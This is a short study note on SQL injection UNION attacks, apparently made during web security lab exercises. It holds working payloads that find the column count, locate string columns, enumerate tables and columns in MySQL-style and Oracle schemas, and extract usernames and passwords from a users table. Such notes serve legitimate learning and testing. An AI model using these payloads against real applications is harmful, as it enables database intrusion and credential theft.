# UNION attack


execute one or more additional `SELECT` queries and *append* the results to the
original query:

EX:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

returns a single result set with two columns, containing a,b,c,d columns.

  * every individual query must return the same number of columns.
  * data types in each column must be compatible between the individual queries.

EXAMINE:
## find returned column count 

use `ORDER BY` or `UNION SELECT NULL --`. [[SQLi UNION Column Count| details]]

## find the compatible column

`'+UNION+SELECT+'abcdef',NULL,NULL--`, replace the string with each NULL in turn to figure out which one returns a string. [[SQLi UNION Compatible Column| details]]

## combine columns

get *two columns in one*: `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

# get *table information* using UNION based attacks:

1. `'UNION SELECT table_name,NULL FROM information_schema.tables-- `

2. `table_schema = database()`: This restricts the query to only retrieve tables
from the current database.
`
```sql
'UNION+SELECT+column_name,NULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME+%3d+'users_lfcfpy'--
'UNION+SELECT+password_esrxvu,username_kpjwmf+FROM+users_lfcfpy--
```

3. oracle:
`
```sql
'UNION SELECT table_name,NULL FROM all_tables--
'UNION select column_name,NULL from ALL_TAB_COLUMNS where table_name='USERS_IMYMYY'-
```
